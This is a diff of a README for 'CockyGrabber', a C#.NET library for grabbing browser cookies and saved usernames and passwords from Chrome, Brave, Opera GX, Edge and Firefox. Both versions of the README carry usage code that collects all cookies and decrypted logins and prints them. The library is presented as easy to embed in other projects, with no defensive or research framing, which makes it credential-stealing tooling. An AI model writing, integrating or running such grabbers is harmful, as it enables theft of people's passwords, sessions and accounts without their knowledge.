@@ -1,177 +1,126 @@
-#### 💣 Old CockyGrabber got deleted by TheBackdoor - Made by TheBackdoor and me 💣
-
 # CockyGrabber
-A Browser Cookies & Passwords Grabber C#.NET Library that you can itegrate in your Projects.
-*(More Supported Browsers in Future!)*
 
-## Download: 
+CockyGrabber is a C#.NET library for collecting browser information such as cookies, logins, and more.
+It's also very *easy* to integrate into your Projects.
 
-For download all necessary packages, you can do from nuget with searching `CockyGrabber` and download the 1.2.0 version. once done, just download the library from the last [release](https://github.com/Stanley-GF/CockyGrabber/releases/download/2.1.0/webGrabber.dll).
+## Table Of Contents
 
-## Usage:
-**Import Cockygrabber classes:**</br>
-It's not necessary but it will look better if you import CockyGrabber:
+1. [Integration](#integration)
+2. [Usage](#usage)
+    * [Importing CockyGrabber](#importing-cockygrabber)
+    * [Grabbing Cookies](#grabbing-cookies)
+    * [Grabbing Logins](#grabbing-logins)
+3. [What's Next](#whats-next)
+4. [End](#end)
+
+## Integration
+
+Before you can use CockyGrabber you will need to download a few necessary packages. You can get them from external sources or easily with [NuGet](https://www.nuget.org/):
+
+* [Newtonsoft.Json](https://www.newtonsoft.com/json)
+* [BouncyCastle](http://www.bouncycastle.org/csharp/)
+* [System.Data.SQLite](https://system.data.sqlite.org/)
+* [System.Security.Cryptography.ProtectedData](http://www.dot.net/)
+
+<!--Or you can download CockyGrabber directly from NuGet with the necessary packages included: [LINK]-->
+
+## Usage
+
+### Importing CockyGrabber
+
 ```cs
 using CockyGrabber;
-using Cookie = CockyGrabber.Classes.Cookie;
+using CockyGrabber.Grabbers;
 ```
-</br>
-then you will need to import a few packages to make CockyGrabber work
+
+### Grabbing Cookies
+
+Grabbing stuff with CockyGrabber is really easy!
+
+To set an example here is how to collect Chrome cookies:
 
 ```cs
-using System.Data.SQLite; // link: https://www.nuget.org/packages/System.Data.SQLite/
-using Newtonsoft.Json; // link: https://www.nuget.org/packages/Newtonsoft.Json/
-using System.Security.Cryptography.ProtectedData; // link: https://www.nuget.org/packages/System.Security.Cryptography.ProtectedData
-using BouncyCastle; // link: https://www.nuget.org/packages/BouncyCastle/
+ChromeGrabber grabber = new ChromeGrabber(); // Define Grabber
+List<Chromium.Cookie> cookies = grabber.GetCookies(); // Collect all Cookies with GetCookies()
+
+// Print Hostname, Name and Value of every cookie:
+foreach(Chromium.Cookie cookie in cookies) // Since Chrome is a Chromium-based Browser it uses Chromium Cookies
+{
+    string cookieHostname = cookie.HostKey;
+    string cookieName = cookie.Name;
+    string cookieValue = cookie.EncryptedValue;
+    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
+}
 ```
 
+*To collect OperaGx, Brave or Edge Cookies just replace `ChromeGrabber` with `OperaGxGrabber`, `BraveGrabber`, and so on.*
 
 </br>
-</br>
 
-**Getting The Key to decrypt cookies:**</br>
-First you need to get a Key to decrypt the Cookies.
+Browsers such as Firefox, which are based on other engines have their own classes, such as 'Firefox.Cookie' since they aren't Chromium-based:
 
-Replace `[GrabberClass]` with the Cookie Grabber Class you want to use (OperaGxGrabber/ChromeGrabber. Firefox doesn't need a key because it don't encrypts cookies)
 ```cs
-[GrabberClass] grabber = new [GrabberClass]
-byte[] keyToDecryptEncrypedDB = grabber.GetKey();
+FirefoxGrabber grabber = new FirefoxGrabber(); // Define Grabber
+List<Firefox.Cookie> cookies = grabber.GetCookies(); // Collect all Cookies with GetCookies()
+
+// Print Hostname, Name and Value of every cookie:
+foreach(Firefox.Cookie cookie in cookies) // Firefox has its own engine and therefore its own Cookie class (Firefox.Cookie)
+{
+    string cookieHostname = cookie.Host;
+    string cookieName = cookie.Name;
+    string cookieValue = cookie.Value;
+    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
+}
 ```
-</br>
-</br>
 
-**Grabbing Cookies:**</br>
-Cookie Grabbing with CockyGrabber is *REALLY EASY*.
-</br>
-</br>
-*Cookie Hostname examples: ".instagram.com" for instagram cookies, ".github.com" for github cookies, ".stackoverflow.com" for stackoverflow cookies, ...*
-</br>
-</br>
-</br>
+### Grabbing Logins
+
+CockyGrabber can also grab Login Data such as Usernames and Passwords.
+
+Here is an example with the `BraveGrabber()`:
 
 
-Firefox Cookie Grabbing:
+```cs
+BraveGrabber grabber = new BraveGrabber(); // Define Grabber
+List<Chromium.Login> logins = grabber.GetLogins(); // Collect all Logins with GetLogins()
+
+// Print the Origin(URL), Username value and Password value of every Login:
+foreach(Chromium.Login login in logins) // Since Brave is a Chromium-based Browser it uses Chromium Logins
+{
+    string loginUrl = login.OriginUrl;
+    string loginUsername = login.UsernameValue;
+    string loginPassword = login.PasswordValue;
+    Console.WriteLine($"{loginUrl} = {loginUsername}:{loginPassword}");
+}
+```
+
+*Same thing goes here if you want to collect OperaGx, Chrome or Edge Cookies just replace `BraveGrabber` with `OperaGxGrabber`, `EdgeGrabber`, ...*
+
+</br>
+
+... And if you want to grab Logins from non-Chromium based browsers like Firefox then you'll need to use a special class like `Firefox.Login`:
 
 ```cs
 FirefoxGrabber grabber = new FirefoxGrabber();
+List<Firefox.Login> logins = grabber.GetLogins();
 
-// Get cookies by hostname:
-foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com"))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-
-// Get All cookies:
-foreach(Cookie cookie in grabber.GetAllCookies())
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-} 
-```
-</br>
-</br>
-
-Chrome Cookie Grabbing:
-</br>
-Since Chrome cookie values are encrypted with BLOB, we need a key to decrypt the data. (I defined the key on line 21, README.md)
-</br>
-
-```cs
-ChromeGrabber grabber = new ChromeGrabber();
-
-// Get cookies by hostname:
-foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-
-// Get All cookies:
-foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
+foreach(Firefox.Login login in logins)
+// ...
 ```
 
-</br>
-</br>
+#### **If you need more examples, then go to the Examples folder!**
 
-OperaGx Cookie Grabbing:
-</br>
-OperaGx also encrypts cookies so you need a key here too.
-</br>
+## What's Next
 
-```cs
-OperaGxGrabber grabber = new OperaGxGrabber();
-
-// Get cookies by hostname:
-foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-
-// Get All cookies:
-foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-```
-</br>
-</br>
-
-Edge Cookie Grabbing:
-</br>
-Edge also encrypts cookies so you need a key here too.
-</br>
-
-```cs
-EdgeGrabber grabber = new EdgeGrabber();
-
-// Get cookies by hostname:
-foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-
-// Get All cookies:
-foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
-{
-    string cookieHostname = cookie.HostName;
-    string cookieName = cookie.Name;
-    string cookieValue = cookie.Value;
-    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
-}
-```
-</br>
-</br>
+1. Adding more Browsers
+2. Turn CockyGrabber into a NuGet Package
+3. Adding custom Functions that replace the packages
+4. Creating a minimalized File that anyone can easily implement in their Project without referencing CockyGrabber itself
 
 ## End
-</br>
-Yea thats it for now. Fork/Star/Watch this repo to dont miss new releases!
-</br>
-</br>
-If you want to script with me then create a Issue!
-</br>
----
+
+Thats it for now!
+
 </br>
 
-If you found any **Bugs** then please create a Issue!
+*CockyGrabber is still in development and will receive future updates* so if you found any **Bugs**, please create an Issue and report it!
